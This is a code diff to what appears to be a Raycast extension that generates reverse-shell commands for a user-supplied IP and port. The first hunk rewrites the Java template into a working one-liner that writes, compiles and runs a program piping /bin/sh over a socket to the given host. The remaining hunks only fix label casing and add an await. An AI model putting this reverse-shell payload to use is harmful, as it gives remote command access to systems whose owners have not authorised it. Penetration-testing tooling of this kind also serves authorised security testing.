@@ -345,7 +345,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     name: "Java",
     icon: "☕",
     command:
-      'java -c \'public class shell { public static void main(String[] args) { try { String host="{IP}"; int port={PORT}; String cmd="/bin/sh"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){} }; p.destroy(); s.close(); } catch (Exception e){} } }\'',
+      'echo \'import java.io.*;import java.net.*;public class shell{public static void main(String[]a){try{String h="{IP}";int p={PORT};Process pr=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();Socket s=new Socket(h,p);InputStream pi=pr.getInputStream(),pe=pr.getErrorStream(),si=s.getInputStream();OutputStream po=pr.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}}catch(Exception e){}}}\' > shell.java && javac shell.java && java shell',
     description: "Java Socket reverse shell",
     category: "reverse",
     subcategory: "Compiled Languages",
@@ -749,14 +749,14 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
                       onAction={() => setSortBy("name")}
                     />
                     <Action
-                      title="Sort by Os"
+                      title="Sort by OS"
                       icon={Icon.ComputerChip}
                       shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
                       onAction={() => setSortBy("os")}
                     />
                   </ActionPanel.Section>
                   <Action
-                    title="Re-enter Ip/port"
+                    title="Re-enter IP/Port"
                     icon={Icon.ArrowClockwise}
                     shortcut={{ modifiers: ["cmd"], key: "r" }}
                     onAction={pop}
@@ -807,7 +807,7 @@ export default function Command() {
     setPortError(undefined);
 
     // Save configuration
-    saveConfig({ ip: values.ip, port: values.port });
+    await saveConfig({ ip: values.ip, port: values.port });
 
     // Navigate to commands list page
     push(<ShowAllCommands ip={values.ip} port={values.port} />);
